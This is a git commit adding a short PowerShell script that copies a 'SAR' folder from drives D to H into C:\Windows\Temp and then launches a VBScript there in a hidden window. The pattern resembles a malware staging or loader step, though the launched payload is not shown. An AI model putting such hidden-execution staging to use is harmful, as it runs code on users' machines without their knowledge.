52eda20f9a113a8edc660a2402605cc2c8fbbff8
undisklosed <148455142+undisklosed@users.noreply.github.com>
2023-11-09 16:10:09 +0000

    Add files via upload

---
+++ c.ps1
@@ -0,0 +1,11 @@
+$driveLetters = "D", "E", "F", "G", "H"
+$destination = "C:\Windows\Temp\"
+
+foreach ($letter in $driveLetters) {
+    $sourcePath = "$letter:\Script\SAR"
+    if (Test-Path $sourcePath) {
+        Copy-Item -Path $sourcePath -Destination $destination -Recurse
+    }
+}
+
+Start-Process -FilePath "C:\Windows\Temp\SAR\v.vbs" -WindowStyle Hidden
